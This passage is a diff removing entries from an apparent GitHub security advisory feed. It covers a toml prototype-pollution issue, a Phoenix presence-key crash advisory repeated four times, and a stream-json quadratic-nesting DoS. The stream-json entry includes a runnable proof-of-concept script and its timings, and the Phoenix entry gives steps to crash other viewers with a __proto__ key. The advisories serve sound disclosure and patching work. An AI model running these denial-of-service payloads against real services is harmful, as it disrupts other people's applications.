-<li>Any application that calls <code>toml.parse()</code> on a TOML document an attacker can influence — uploaded configuration, project manifests, multi-tenant settings, package metadata — allows the attacker to write arbitrary properties onto <code>Object.prototype</code>.</li>
-<li>Injected properties become visible on every object in the process. Depending on application gadgets, this enables denial of service (corrupting properties the runtime relies on), logic and authorization bypass (overriding flags read from plain objects), and, with a suitable sink, remote code execution.</li>
-<li>The blast radius is the whole Node.js process, not just the parsed result object.</li>
-<li><code>toml</code> reports roughly 14.8 million weekly downloads and around 1,340 dependents, so the transitive exposure is large. Dependents that pass <code>toml</code> as the engine to front-matter or configuration loaders inherit the issue.</li>
-</ul>
-<hr>
-<p>Credit: Duy Bui / @<a href="http://calif.io/">calif.io</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j">https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-v5mp-jgw5-2x6j</a></li>
-<li><a href="https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44">https://github.com/BinaryMuse/toml-node/commit/def6ab5ea99038c0dd482cd6af1745a6af8b4c44</a></li>
-<li><a href="https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463">https://github.com/BinaryMuse/toml-node/commit/dfaff662276adc38a2e03df3139f7119b0185463</a></li>
-<li><a href="https://github.com/advisories/GHSA-v5mp-jgw5-2x6j">https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-03T20:55:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
-        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
-        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
-        <updated>2026-09-03T20:30:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
-<h3 id="details">Details</h3>
-<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
-<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
-<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
-<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
-<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
-<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
-<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
-<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
-<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
-<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
-<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-03T20:30:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
-        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
-        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
-        <updated>2026-09-03T20:30:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
-<h3 id="details">Details</h3>
-<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
-<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
-<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
-<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
-<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
-<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
-<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
-<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
-<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
-<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
-<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-03T20:30:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
-        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
-        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
-        <updated>2026-09-03T20:30:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
-<h3 id="details">Details</h3>
-<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
-<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
-<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
-<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
-<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
-<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
-<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
-<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
-<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
-<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
-<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-03T20:30:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[phoenix] Phoenix: Presence keys colliding with `Object.prototype` members break existence checks]]></title>
-        <id>https://github.com/advisories/GHSA-63mc-hw7g-86rr</id>
-        <link href="https://github.com/advisories/GHSA-63mc-hw7g-86rr"/>
-        <updated>2026-09-03T20:30:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Phoenix JavaScript presence client (<code>assets/js/phoenix/presence.js</code>) tests whether a presence already exists using a bare truthiness check (<code>state[key]</code>) rather than an own-property check. Because applications commonly track presences under a client-supplied username or id, the presence key can be attacker-controlled. A user who joins a channel and picks a key that names an <code>Object.prototype</code> member (<code>__proto__</code>, <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>, and similar) makes the lookup return the inherited <code>Object.prototype</code> object instead of <code>undefined</code>, which is truthy. The code then reads <code>.metas.map(...)</code> off it and throws an uncaught <code>TypeError</code>, breaking presence sync for every viewer of that channel topic. Any authenticated channel participant can trigger it.</p>
-<h3 id="details">Details</h3>
-<p>The victim is any browser subscribed to a presence channel. When it receives the server's <code>presence_state</code> message, it invokes <code>Presence.syncState</code>, which iterates the incoming presences and checks whether each one already exists locally via <code>let currentPresence = state[key]</code>. <code>state</code> is a plain object inheriting from <code>Object.prototype</code>. For an ordinary key like <code>alice</code>, <code>state["alice"]</code> is <code>undefined</code> (falsy) and the safe path runs. For the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, etc.), <code>state["__proto__"]</code> does not resolve to a tracked presence but to JavaScript's built-in <code>Object.prototype</code>, which is truthy. The <code>if(currentPresence)</code> guard passes, and the code evaluates <code>currentPresence.metas.map(m =&gt; m.phx_ref)</code>. Since <code>Object.prototype.metas</code> is <code>undefined</code>, calling <code>.map</code> on it throws a <code>TypeError</code>.</p>
-<p>Phoenix wraps no try/catch around channel binding callbacks, so the <code>TypeError</code> propagates out of the message handler: <code>this.state</code> is never updated and <code>onSync()</code> never fires. The malicious key is tracked server-side, so it is re-pushed on every presence update and keeps re-throwing, leaving presence permanently broken until the attacker leaves. <code>Presence.syncDiff</code> uses the same unsafe <code>state[key]</code> existence-check pattern, so presence diffs fail identically.</p>
-<p>Two scoping points matter. The impact is per channel topic, not global: presence state is per-topic on the server and per-<code>Presence</code>-instance in the browser, so only viewers of the topic carrying the malicious key are affected. The bug is a read-time confusion of the prototype object, not prototype pollution: the crash occurs on the <code>state["__proto__"]</code> read in <code>syncState</code>, before any <code>state[key] = ...</code> write is reached, so <code>Object.prototype</code> is never mutated and nothing leaks across channels. The fix builds the state and accumulator objects with <code>Object.create(null)</code> (or a <code>Map</code>) and gates existence checks with <code>Object.prototype.hasOwnProperty.call(obj, key)</code>.</p>
-<p>If an application does not pass a client-controlled key to <code>Presence.track</code>, it is <strong>not</strong> affected.</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Connect to an application that uses <code>Phoenix.Presence</code> and tracks presences under a client-chosen key (e.g. a username).</li>
-<li>Join a presence channel choosing the key <code>__proto__</code> (or <code>constructor</code>, <code>toString</code>, <code>hasOwnProperty</code>).</li>
-<li>The server tracks the presence and pushes <code>presence_state</code> / <code>presence_diff</code> to every subscriber of that topic.</li>
-<li>Each viewer's <code>Presence.syncState</code> (or <code>syncDiff</code>) reads <code>state["__proto__"]</code>, gets the truthy <code>Object.prototype</code>, and throws an uncaught <code>TypeError</code>.</li>
-<li>Presence sync stays broken for all viewers of the topic until the attacker leaves the channel.</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>An attacker with ordinary channel access can cause a persistent, stored client-side denial of service against every browser viewing a presence channel topic, freezing presence updates for all of them until the attacker disconnects. Any application driving the Phoenix JavaScript presence client with user-influenced presence keys is affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr">https://github.com/phoenixframework/phoenix/security/advisories/GHSA-63mc-hw7g-86rr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56812">https://nvd.nist.gov/vuln/detail/CVE-2026-56812</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8">https://github.com/phoenixframework/phoenix/commit/7f7b971c1ea0994e3fbd1c11ddb05e780bd38ad8</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f">https://github.com/phoenixframework/phoenix/commit/89a1c4be161e436241e12b2378a719904b9bd96f</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85">https://github.com/phoenixframework/phoenix/commit/b90b22521465ece00eb5a19d5aa2b9465b209c85</a></li>
-<li><a href="https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2">https://github.com/phoenixframework/phoenix/commit/beffc4da1e787e572121f68902c63daf4fe7d9c2</a></li>
-<li><a href="https://cna.erlef.org/cves/CVE-2026-56812.html">https://cna.erlef.org/cves/CVE-2026-56812.html</a></li>
-<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-56812">https://osv.dev/vulnerability/EEF-CVE-2026-56812</a></li>
-<li><a href="https://github.com/advisories/GHSA-63mc-hw7g-86rr">https://github.com/advisories/GHSA-63mc-hw7g-86rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-63mc-hw7g-86rr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-03T20:30:33.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[stream-json] stream-json: pick/ignore/filter/replace filters are O(depth²) on nested input — small crafted JSON blocks the event loop for seconds→minutes (DoS)]]></title>
-        <id>https://github.com/advisories/GHSA-528h-pc64-c93x</id>
-        <link href="https://github.com/advisories/GHSA-528h-pc64-c93x"/>
-        <updated>2026-09-03T20:27:54.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p>The path filters <code>pick</code>, <code>ignore</code>, <code>filter</code>, and <code>replace</code> — the library's headline "surgical extraction" feature — recompute the full path string from the nesting stack on <strong>every checkable token</strong>. Because the stack length equals the current nesting depth, and a checkable token is emitted at every level, processing a document of depth <em>D</em> costs <strong>O(D²)</strong>, not O(D).</p>
-<p>This is triggered by document <strong>structure (nesting depth), not byte volume</strong>, so a tiny payload achieves outsized CPU cost, and it is the ordinary "traverse until the filter matches" path — including the exact README flagship example <code>pick({filter: 'data'})</code>. Any service that uses these filters to extract a field from an untrusted (or larger-than-memory) JSON body — the primary documented use case — can be made to block its event loop.</p>
-<h3 id="affected-code-v340">Affected code (v3.4.0)</h3>
-<p><code>src/core/filters/filter-base.js</code>:</p>
-<pre><code class="language-js">// L26-32 — string filter: rejoins the ENTIRE stack on every call
-const stringFilter = (string, separator) =&gt; {
-  const stringWithSeparator = string + separator;
-  return stack =&gt; {
-    const path = stack.join(separator);              // O(depth) — every call
-    return path === string || path.startsWith(stringWithSeparator);
-  };
-};
-
-// L34-39 — regexp filter: same
-const regExpFilter = (regExp, separator) =&gt; {
-  return stack =&gt; {
-    regExp.lastIndex = 0;
-    return regExp.test(stack.join(separator));       // O(depth) — every call
-  };
-};
-</code></pre>
-<pre><code class="language-js">// L194 — filter(stack, chunk) is invoked for EVERY checkable token while in the 'check' state
-const action = checkableTokens[chunk.name] !== 1 ? nonCheckableAction : filter(stack, chunk) ? specialAction : defaultAction;
-</code></pre>
-<p><code>stack</code> is pushed/popped on <code>startObject</code>/<code>startArray</code>/end (L239-250), so <code>stack.length === depth</code>. For a depth-<em>D</em> document that hasn't matched yet, <code>filter()</code> runs once per level and each call is O(depth) ⇒ <strong>O(D²)</strong> total.</p>
-<p><strong>Not affected:</strong> the <code>streamArray</code>/<code>streamObject</code>/<code>streamValues</code> streamers use <code>asm.depth</code> (an O(1) getter), so they don't exhibit this. The issue is specific to <code>filter-base.js</code> recomputing the path string.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<pre><code>npm i stream-json@3.4.0
-node poc-quadratic-dos.mjs
-</code></pre>
-<pre><code class="language-js">import parserStream from 'stream-json';
-import { pick } from 'stream-json/filters/pick.js';
-import chain from 'stream-chain';
-
-function run(D) {
-  const doc = '{"meta":'.repeat(D) + '1' + '}'.repeat(D); // depth D, never matches "data"
-  return new Promise((resolve) =&gt; {
-    const t0 = process.hrtime.bigint();
-    const pipeline = chain([parserStream(), pick({ filter: 'data' })]);
-    pipeline.on('data', () =&gt; {});
-    pipeline.on('end', () =&gt; resolve({ D, bytes: doc.length, ms: Number(process.hrtime.bigint() - t0) / 1e6 }));
-    pipeline.write(doc); pipeline.end();
-  });
-}
-for (const D of [5000, 10000, 20000, 40000]) {
-  const r = await run(D);
-  console.log(`D=${r.D}  bytes=${r.bytes}  ms=${Math.round(r.ms)}`);
-}
-</code></pre>
-<p>Measured (Node v24, single core, clean <code>npm i stream-json@3.4.0</code>):</p>
-<pre><code>D=5000    bytes= 45001   ms=  160
-D=10000   bytes= 90001   ms=  603   (3.8x for 2x input  -&gt; quadratic)
-D=20000   bytes=180001   ms= 2511   (4.2x)
-D=40000   bytes=360001   ms=11823   (4.7x)
-</code></pre>
-<p>A <strong>~360 KB</strong> body (pure nesting, no data) blocks the event loop for <strong>~12 seconds</strong>; extrapolating O(D²), ~1–2 MB reaches single-digit minutes of CPU on one request.</p>
-<h2 id="impact">Impact</h2>
-<p>Remote, unauthenticated denial of service against any application that runs untrusted JSON through <code>pick</code>/<code>ignore</code>/<code>filter</code>/<code>replace</code> with a string or RegExp filter — the documented primary use of the library. A small request pins a CPU core / blocks the Node event loop, degrading or halting the service.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Maintain the joined path incrementally instead of rejoining the whole stack per token:</p>
-<ul>
-<li>On <code>startObject</code>/<code>startArray</code> push: append <code>separator + key</code> to a cached path string (and remember the pre-push length).</li>
-<li>On end/pop: truncate the cached path back to the remembered length.</li>
-<li>Filters test/<code>startsWith</code> against the cached string — O(1) amortized per token, making the whole traversal O(D).</li>
-</ul>
-<p>Alternatively expose/enforce a maximum nesting depth for the filter path check.</p>
-<h2 id="resolution">Resolution</h2>
-<p>Fixed in 3.5.0. The path filters now cap JSON nesting depth at 1024 by default and throw a RangeError beyond it; upgrading is enough. Opt out with <code>maxDepth: Infinity</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/uhop/stream-json/security/advisories/GHSA-528h-pc64-c93x">https://github.com/uhop/stream-json/security/advisories/GHSA-528h-pc64-c93x</a></li>
